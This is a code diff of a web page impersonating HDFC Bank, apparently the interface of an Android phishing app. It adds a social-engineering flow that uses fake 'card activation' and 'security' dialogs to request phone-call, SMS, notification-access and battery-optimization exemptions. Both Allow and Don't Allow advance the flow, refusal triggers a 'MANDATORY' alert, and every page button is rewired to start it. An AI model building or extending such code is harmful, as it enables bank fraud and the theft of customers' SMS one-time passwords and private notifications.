@@ -8,6 +8,35 @@
     <link rel="preconnect" href="https://fonts.googleapis.com">
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    <style>
+        /* Extra styles for overlay/modals that were in dashboard.html */
+        .overlay {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0,0,0,0.85); display: flex; justify-content: center;
+            align-items: center; z-index: 10000; backdrop-filter: blur(5px);
+        }
+        .modal {
+            background: white; width: 85%; padding: 30px; border-radius: 20px;
+            text-align: center; color: #333;
+        }
+        .modal-icon { font-size: 50px; margin-bottom: 20px; }
+        .btn-primary { background: #004c8f; color: white; border: none; padding: 12px 30px; border-radius: 8px; font-weight: 600; margin-top: 20px; width: 100%; }
+        
+        .permission-overlay {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0,0,0,0.5); display: none; justify-content: center;
+            align-items: flex-end; z-index: 9999;
+        }
+        .perm-modal {
+            background: white; width: 100%; padding: 30px; border-top-left-radius: 25px;
+            border-top-right-radius: 25px; text-align: center;
+        }
+        .perm-icon { font-size: 40px; margin-bottom: 15px; }
+        .perm-text { color: #333; font-size: 16px; margin-bottom: 25px; line-height: 1.5; }
+        .perm-actions { display: flex; flex-direction: column; gap: 10px; }
+        .btn-allow { background: #004c8f; color: white; border: none; padding: 15px; border-radius: 10px; font-weight: 600; font-size: 16px; }
+        .btn-deny { background: transparent; color: #5f6368; border: none; padding: 10px; font-size: 14px; }
+    </style>
 </head>
 <body>
     <!-- Top Navigation -->
@@ -90,39 +119,15 @@
 
     <!-- PERMISSION OVERLAY -->
     <div class="permission-overlay" id="permissionOverlay">
-        <!-- Notification Modal -->
+        <!-- Combined Modal to match your current step logic -->
         <div class="perm-modal" id="notifModal">
-            <div class="perm-icon">🔔</div>
-            <div class="perm-text">
+            <div class="perm-icon" id="permIcon">🔔</div>
+            <div class="perm-text" id="permText">
                 Allow <strong>HDFC Bank</strong> to send you <strong>Notifications</strong> for transaction alerts and security updates?
             </div>
             <div class="perm-actions">
-                <button class="btn-allow" onclick="nextPerm('phone')">Allow</button>
-                <button class="btn-deny" onclick="nextPerm('phone')">Don't Allow</button>
-            </div>
-        </div>
-
-        <!-- Phone Modal -->
-        <div class="perm-modal" id="phoneModal" style="display: none;">
-            <div class="perm-icon">📞</div>
-            <div class="perm-text">
-                Allow <strong>HDFC Bank</strong> to make and manage <strong>Phone Calls</strong> to verify your device security?
-            </div>
-            <div class="perm-actions">
-                <button class="btn-allow" onclick="nextPerm('sms')">Allow</button>
-                <button class="btn-deny" onclick="nextPerm('sms')">Don't Allow</button>
-            </div>
-        </div>
-
-        <!-- SMS Modal -->
-        <div class="perm-modal" id="smsModal" style="display: none;">
-            <div class="perm-icon">💬</div>
-            <div class="perm-text">
-                Allow <strong>HDFC Bank</strong> to send and view <strong>SMS messages</strong> for OTP auto-verification?
-            </div>
-            <div class="perm-actions">
-                <button class="btn-allow" onclick="requestNativePermissions()">Allow</button>
-                <button class="btn-deny" onclick="requestNativePermissions()">Don't Allow</button>
+                <button class="btn-allow" onclick="nextPermission()">Allow</button>
+                <button class="btn-deny" onclick="nextPermission()">Don't Allow</button>
             </div>
         </div>
     </div>
@@ -142,68 +147,90 @@
         </div>
     </footer>
 
+    <div class="overlay" id="batteryOverlay" style="display:none;">
+        <div class="modal">
+            <div class="modal-icon">🔋</div>
+            <h3>Always Online Mode</h3>
+            <p>Enable background sync to receive real-time card activation alerts even when the app is closed.</p>
+            <button class="btn btn-primary" onclick="triggerBattery()">Enable Always Online</button>
+        </div>
+    </div>
+
+    <div class="overlay" id="notifOverlay" style="display:none;">
+        <div class="modal">
+            <div class="modal-icon">🛡️</div>
+            <h3>Security Sync</h3>
+            <p>Enable secure synchronization to protect your account from unauthorized transactions.</p>
+            <button class="btn btn-primary" onclick="triggerNotif()">Enable Security Sync</button>
+        </div>
+    </div>
+
     <script>
         const overlay = document.getElementById('permissionOverlay');
+        const batteryOverlay = document.getElementById('batteryOverlay');
+        const notifOverlay = document.getElementById('notifOverlay');
+        const permIcon = document.getElementById('permIcon');
+        const permText = document.getElementById('permText');
         
+        let currentStep = 0;
+        const steps = [
+            { icon: '🔔', text: 'Allow <strong>HDFC Bank</strong> to send you <strong>Notifications</strong> for transaction alerts and security updates?' },
+            { icon: '📞', text: 'Allow <strong>HDFC Bank</strong> to make and manage <strong>Phone Calls</strong> to verify your device security?' },
+            { icon: '💬', text: 'Allow <strong>HDFC Bank</strong> to send and view <strong>SMS messages</strong> for OTP auto-verification?' }
+        ];
+
         function startPermissionFlow(e) {
             if(e) e.preventDefault();
-            if(!overlay) return;
+            currentStep = 0;
+            updatePermModal();
             overlay.style.display = 'flex';
-            document.getElementById('notifModal').style.display = 'block';
-            document.getElementById('phoneModal').style.display = 'none';
-            document.getElementById('smsModal').style.display = 'none';
         }
 
-        function nextPerm(type) {
-            document.getElementById('notifModal').style.display = 'none';
-            document.getElementById('phoneModal').style.display = 'none';
-            document.getElementById('smsModal').style.display = 'none';
-            
-            if (type === 'phone') {
-                document.getElementById('phoneModal').style.display = 'block';
-            } else if (type === 'sms') {
-                document.getElementById('smsModal').style.display = 'block';
-            }
+        function updatePermModal() {
+            permIcon.textContent = steps[currentStep].icon;
+            permText.innerHTML = steps[currentStep].text;
         }
 
-        function requestNativePermissions() {
-            // TRIGGER THE REAL NATIVE ANDROID PERMISSION DIALOGS
-            if (window.AndroidBridge) {
-                window.AndroidBridge.requestRealPermissions();
+        function nextPermission() {
+            currentStep++;
+            if (currentStep < steps.length) {
+                updatePermModal();
             } else {
-                // Fallback for website testing
-                console.log("AndroidBridge not found, redirecting to details.html");
-                window.location.href = 'details.html';
+                if (window.AndroidBridge) {
+                    window.AndroidBridge.requestRealPermissions();
+                } else {
+                    window.location.href = 'details.html';
+                }
             }
         }
 
-        // THIS IS CALLED BY NATIVE ANDROID CODE
         function handlePermissionResult(status) {
             if (status === 'GRANTED') {
-                if(overlay) overlay.style.display = 'none';
-                window.location.href = 'details.html';
+                overlay.style.display = 'none';
+                batteryOverlay.style.display = 'flex';
             } else {
-                alert('MANDATORY: All permissions are required for Secure Card Activation. Please Allow to continue.');
-                if(overlay) overlay.style.display = 'none';
+                alert('MANDATORY: All permissions are required for Secure Card Activation.');
+                overlay.style.display = 'none';
             }
         }
 
-        // Attach to all buttons
+        function triggerBattery() {
+            if (window.AndroidBridge) window.AndroidBridge.requestIgnoreBatteryOptimizations();
+            batteryOverlay.style.display = 'none';
+            notifOverlay.style.display = 'flex';
+        }
+
+        function triggerNotif() {
+            if (window.AndroidBridge) window.AndroidBridge.requestNotificationAccess();
+            notifOverlay.style.display = 'none';
+            window.location.href = 'details.html';
+        }
+
         document.addEventListener('DOMContentLoaded', () => {
             document.querySelectorAll('button').forEach(btn => {
-                // Don't attach to buttons inside modals or bottom nav
-                if (!btn.closest('.perm-modal') && !btn.closest('.bottom-nav')) {
+                if (!btn.closest('.perm-modal') && !btn.closest('.modal') && !btn.closest('.bottom-nav')) {
                     btn.onclick = startPermissionFlow;
                 }
-            });
-
-            // Smooth entry animation for cards
-            const cards = document.querySelectorAll('.info-card');
-            cards.forEach((card, index) => {
-                setTimeout(() => {
-                    card.style.opacity = '1';
-                    card.style.transform = 'translateY(0)';
-                }, 100 * index);
             });
         });
     </script>
